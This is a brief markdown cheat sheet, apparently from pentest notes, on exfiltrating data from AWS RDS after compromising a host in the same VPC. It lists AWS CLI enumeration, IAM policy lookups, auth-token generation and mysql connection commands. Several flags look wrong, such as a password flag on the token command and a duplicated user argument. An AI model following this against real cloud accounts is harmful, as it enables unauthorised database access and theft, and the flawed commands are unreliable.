# AWS RDS Data Exfiltration

### If the instance is in a security group or VPC, we need to compromise it first to access the database (For example, we compromise an EC2 instance in the same VPC, then its possible to connect)

## Steps:

#### 1) List instances in RDS

    aws rds describe-db-instances

#### 2) List information about the specified security group

    aws ec2 describe-security-groups --group-ids ID

## Password based authentication:

    mysql -h HOSTNAME -u USERNAME -P PORT -p PASSWORD

## IAM based authentication

#### 1) Identify the user

    aws sts get-caller-identity

#### 2) List all policies attached to a role

    aws iam list-attached-role-policies --role-name NAME

#### 3) Get information about a specific version of a policy

    aws iam get-policy-version --policy-arn ARN --version-id ID

#### 4) Get temporary token from RDS (Put TOKEN=$(INSERT_THE_COMMAND_HERE)for using it as a variable)

    aws rds generate-db-auth-token --hostname HOSTNAME --port PORT --username USERNAME --password PASSWORD 

## TIP: We can put it in a variable for ease of use

#### 5) Connect to the DB using the token

    mysql -h HOSTNAME -u USERNAME -P PORT --enable-cleartext-plugin --user=USER --password=PASSWORD
